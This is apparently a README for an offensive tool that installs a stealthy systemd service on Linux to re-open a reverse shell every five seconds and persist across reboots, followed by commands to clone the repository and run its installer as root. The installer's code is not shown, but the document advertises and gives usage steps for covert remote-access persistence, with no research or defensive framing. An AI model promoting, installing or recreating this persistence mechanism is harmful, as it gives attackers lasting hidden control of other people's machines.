# Linux Systemd Persistence Installer

**Stealthy Linux Persistence via Systemd Service**

This script sets up **systemd-based persistence** by creating a service that **automatically re-establishes a reverse shell every 5 seconds**, even after a reboot.

## 🚀 Features
- **Stealthy systemd-based persistence**
- **Automatic reverse shell execution**
- **Triggers every 5 seconds**
- **Restores even after system reboot**

## 📌 Installation & Usage
> **⚠️ This script must be run as root!**  

```bash
git clone https://github.com/BL4CK-D3VIL/systemd_persistence.git
cd linux-persistence
chmod +x installer.sh
sudo ./installer.sh
